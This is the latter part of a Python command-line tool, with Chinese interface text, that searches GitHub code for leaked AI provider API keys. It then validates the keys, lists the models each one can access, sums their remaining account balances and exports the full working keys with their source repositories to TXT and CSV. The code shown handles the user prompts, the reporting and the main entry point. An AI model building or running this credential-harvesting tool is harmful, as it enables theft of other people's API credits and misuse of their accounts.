        print(f"  {i:>2}. {cn}")
    print(f"  输入序号（多选用逗号隔开 范围框选例如1-10） 回车=全部勾选")
    while True:
        try: ch = input("  > ").strip()
        except: return pl
        if not ch or ch == "0": return pl
        sel = set()
        for part in re.split(r'[,，\s]+', ch):
            part = part.strip()
            if not part: continue
            if "-" in part:
                try:
                    a, b = part.split("-", 1)
                    for idx in range(int(a), int(b) + 1):
                        if 1 <= idx <= len(pl): sel.add(pl[idx - 1])
                except: pass
            else:
                try:
                    idx = int(part)
                    if 1 <= idx <= len(pl): sel.add(pl[idx - 1])
                except: pass
        result = [p for p in pl if p in sel]
        if not result: print(f"  未选中"); continue
        print(f"  已选: {', '.join(PROVIDER_CN.get(p.value, p.value) for p in result)}")
        try: cf = input(f"  确认? (y/n): ").strip().lower()
        except: return result
        if cf in ("y", "yes"): return result
        print(f"  重新选择")

def input_pages():
    print(c("bold","\n[3/4] 页码范围"))
    print(f"  搜索范围 例如1~10 范围越大 搜索时间越长")
    while True:
        try: ch = input(f"  范围 (回车=1-3): ").strip()
        except: return 1, 3, ""
        if not ch: sp, ep = 1, 3; break
        m = re.match(r'(\d+)\s*[-–—]\s*(\d+)', ch)
        if m: sp = max(1, int(m.group(1))); ep = max(sp, int(m.group(2))); break
        try: sp = 1; ep = max(1, int(ch)); break
        except: print(f"  格式: 1-5")
    try: kw = input(f"  自定义关键词,逗号分隔 (回车跳过): ").strip()
    except: kw = ""
    if kw:
        global CUSTOM_QUERIES
        CUSTOM_QUERIES = [x.strip() for x in kw.split(",") if x.strip()]
    return sp, ep, kw

def input_sort_order():
    global SORT_FIELD, SORT_ORDER
    print(c("bold","\n[4/4] 排序方式"))
    print(f"    1. 最新优先  ← 默认")
    print(f"    2. 最早优先")
    print(f"    3. 最佳匹配")
    while True:
        try: ch = input(f"  选择 (回车=1): ").strip()
        except: return
        if not ch or ch == "1":
            SORT_FIELD, SORT_ORDER = "indexed", "desc"; break
        if ch == "2":
            SORT_FIELD, SORT_ORDER = "indexed", "asc"; break
        if ch == "3":
            SORT_FIELD, SORT_ORDER = "", ""; break
        print(f"  无效选择")
    if SORT_FIELD:
        print(f"  排序: {SORT_FIELD} / {SORT_ORDER}")
    else:
        print(f"  排序: 最佳匹配")

def _compute_balance_totals(results):
    totals = {}
    for keys in results.values():
        for vk in keys:
            bal = vk.balance
            if not bal or bal == "--":
                continue
            # 输出格式
            parts = bal.split("|")
            if len(parts) != 2:
                continue
            try:
                amount = float(parts[0])
            except ValueError:
                continue
            currency = parts[1].strip().upper()
            totals[currency] = totals.get(currency, 0.0) + amount
    return totals


def print_results(results, stats):
    total = sum(len(v) for v in results.values())
    if total == 0: print(f"\n  未发现有效密钥\n"); return

    # 余额汇总
    totals = _compute_balance_totals(results)
    if totals:
        print()
        for cur in sorted(totals.keys()):
            amt = totals[cur]
            if abs(amt) < 0.005:
                continue
            color = "G" if amt > 0 else "R"
            print(f"  {cur}总额: {c(color, f'{amt:.2f}')}")
    print(f"\n  共 {c('G', str(total))} 个有效密钥  |  {stats.queries_run}次查询 {stats.files_fetched}文件")

    for pn in sorted(results.keys()):
        keys = results[pn]
        cn = PROVIDER_CN.get(pn, pn)
        bal_keys = [vk for vk in keys if vk.balance and vk.balance != "--"]
        print(f"\n{c('B','┌' + '─' * 63 + '┐')}")
        print(f"{c('B','│')} {c('bold', f'{cn} ({pn})')}")
        print(f"{c('B','│')} {c('Y', f'有效密钥: {len(keys)} 个')}  |  {c('G', f'有余额: {len(bal_keys)} 个')}")
        print(f"{c('B','├' + '─' * 63 + '┤')}")
        for i, vk in enumerate(keys, 1):
            tag = c('K', f'#{i}')
            print(f"{c('B','│')} {tag} {c('G', vk.key_full)}")
            print(f"{c('B','│')}   {c('K', '仓库:')} {vk.repo_url}")
            if vk.models:
                models_str = ", ".join(vk.models[:5])
                if len(vk.models) > 5:
                    models_str += f" ...共{len(vk.models)}个"
                print(f"{c('B','│')}   {c('K', '模型:')} {models_str}")
            if vk.balance and vk.balance != "--":
                print(f"{c('B','│')}   {c('Y', '余额:')} {vk.balance}")
        print(f"{c('B','└' + '─' * 63 + '┘')}")
    print()

def _print_key_list(results):
    totals = _compute_balance_totals(results)
    for cur in sorted(totals.keys()):
        amt = totals[cur]
        if abs(amt) < 0.005:
            amt = 0.0
        c2 = "G" if amt > 0 else "R"
        print(f"  {cur}总额: {c(c2, f'{amt:.2f}')}")

    print(f"  有效key列表:")
    for pn in sorted(results.keys()):
        for vk in results[pn]:
            print(f"  {vk.key_full}")
    print()

def _save_txt(results, stats, filepath):
    lines = []
    lines.append("=" * 60)
    lines.append("  APIKey Leak 扫描报告")
    lines.append("=" * 60)
    lines.append(f"  扫描时间: {stats.start_time} ~ {stats.end_time}")
    lines.append(f"  查询次数: {stats.queries_run}  获取文件: {stats.files_fetched}")
    lines.append(f"  原始密钥: {stats.raw_keys_found}  测试数量: {stats.keys_tested}  有效: {stats.keys_valid}")
    lines.append("")

    totals = _compute_balance_totals(results)
    if totals:
        lines.append("  余额汇总:")
        for cur in sorted(totals.keys()):
            amt = totals[cur]
            if abs(amt) < 0.005:
                continue
            lines.append(f"    {cur}: {amt:.2f}")
        lines.append("")

    total = sum(len(v) for v in results.values())
    lines.append(f"  共 {total} 个有效密钥")
    lines.append("")

    for pn in sorted(results.keys()):
        keys = results[pn]
        cn = PROVIDER_CN.get(pn, pn)
        lines.append("-" * 60)
        lines.append(f"  {cn} ({pn})")
        lines.append(f"  有效: {len(keys)} 个")
        lines.append("")
        for i, vk in enumerate(keys, 1):
            lines.append(f"  [{i}] {vk.key_full}")
            lines.append(f"      仓库: {vk.repo_url}")
            lines.append(f"      文件: {vk.file_path}")
            if vk.models:
                lines.append(f"      模型: {', '.join(vk.models)}")
            if vk.balance and vk.balance != "--":
                lines.append(f"      余额: {vk.balance}")
            lines.append("")
        lines.append("")

    lines.append("=" * 60)
    lines.append("  密钥列表:")
    lines.append("=" * 60)
    for pn in sorted(results.keys()):
        for vk in results[pn]:
            lines.append(f"  {vk.key_full}")

    with open(filepath, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    print(f"  已保存: {filepath}")


# 主入口
def parse_args():
    p=argparse.ArgumentParser(description="APIKey Leak - GitHub AI 密钥扫描器")
    p.add_argument("--token",default="",help="GitHub Token，多个逗号分隔")
    p.add_argument("--providers",nargs="*",default=[],help="厂商")
    p.add_argument("--start-page",type=int,default=0); p.add_argument("--end-page",type=int,default=0)
    p.add_argument("--concurrency",type=int,default=0)
    p.add_argument("--output",default="api_key_leak_results.txt")
    p.add_argument("--csv",default="")
    p.add_argument("--sort",default=None,choices=["indexed",""],help="排序字段，默认indexed。留空=最佳匹配")
    p.add_argument("--order",default=None,choices=["desc","asc"],help="排序方向，默认desc")
    p.add_argument("--search-rate",type=int,default=10,help="代码搜索限速（次/分钟），默认10")
    p.add_argument("--no-interactive",action="store_true",help="纯自动模式，不交互")
    return p.parse_args()


async def main():
    try:
        args = parse_args()
        show_logo()
        interactive = not args.no_interactive

        # Token
        t = args.token or ""
        if not t and interactive:
            t = input_token()
        if not t:
            print(f"{c('R','[!] 无 Token，退出')}"); return
        global TOKEN_POOL
        TOKEN_POOL = [x.strip() for x in re.split(r'[,\s]+', t) if x.strip().startswith("ghp_") and not any(p in x.lower() for p in ("xxx","yyy","zzz","example","test_","your_","abc123","def456","ghi789","placeholder","<<","你的"))]
        for i in range(len(TOKEN_POOL)):
            TOKEN_STATE[i] = {"reset": 0, "remain": 30}
        print(f"  {len(TOKEN_POOL)} Token 就绪")

        # 厂商
        target = []
        if args.providers:
            for n in args.providers:
                try: target.append(Provider[n.upper()])
                except: print(f"  未知厂商: {n}")
        if not target and interactive:
            target = select_providers()
        if not target:
            print(f"{c('R','[!] 无厂商，退出')}"); return
        print(f"  {len(target)} 厂商: {', '.join(PROVIDER_CN.get(p.value, p.value) for p in target)}")

        # 页码
        sp = args.start_page
        ep = args.end_page
        kw = ""
        if sp < 1 or ep < 1:
            if interactive:
                sp, ep, kw = input_pages()
            else:
                sp, ep = 1, 3
        sp = max(1, sp); ep = max(sp, ep)
        print(f"  页码: {sp}-{ep} ({ep-sp+1}页)")

        # 排序
        global SORT_FIELD, SORT_ORDER
        if args.sort is not None or args.order is not None:
            SORT_FIELD = args.sort if args.sort is not None else "indexed"
            SORT_ORDER = args.order if args.order is not None else "desc"
        elif interactive:
            input_sort_order()
        if SORT_FIELD:
            print(f"  排序: {SORT_FIELD} / {SORT_ORDER}")
        else:
            print(f"  排序: 最佳匹配")

        global SEARCH_RATE
        SEARCH_RATE = args.search_rate
        concurrency = args.concurrency or 25

        if interactive:
            try:
                cf = input(f"  开始? (y/n): ").strip().lower()
            except:
                cf = ""
            if cf not in ("y", "yes", ""):
                print("  已取消"); return
        else:
            print(f"  {c('K','[自动模式] 直接开始...')}")

        results, stats = await run_scan(
            start_page=sp, end_page=ep, concurrency=concurrency,
            target=target, extra_queries=None)

        # 输出 TXT
        print_results(results, stats)
        _print_key_list(results)
        _save_txt(results, stats, args.output)

        if args.csv:
            import csv
            with open(args.csv,"w",newline="",encoding="utf-8-sig") as f:
                w=csv.writer(f)
                w.writerow(["厂商","密钥","哈希","仓库","文件","模型数","模型","余额","时间"])
                for pn in sorted(results.keys()):
                    cn=PROVIDER_CN.get(pn,pn)
                    for vk in results[pn]:
                        w.writerow([cn,vk.key_full,vk.key_hash,vk.repo_url,vk.file_path,len(vk.models)," | ".join(vk.models),vk.balance,vk.found_at])
            print(f"  已保存: {args.csv}")

        total=sum(len(v) for v in results.values())
        print(f"\n  {c('G', '[*]')} 扫描完毕. {total}个密钥 {len(results)}个厂商\n")
    finally:
        # EXE窗口保持
        if getattr(sys, 'frozen', False):
            input("\n  按回车键退出...")

if __name__=="__main__":
    try: asyncio.run(main())
    except SystemExit: pass
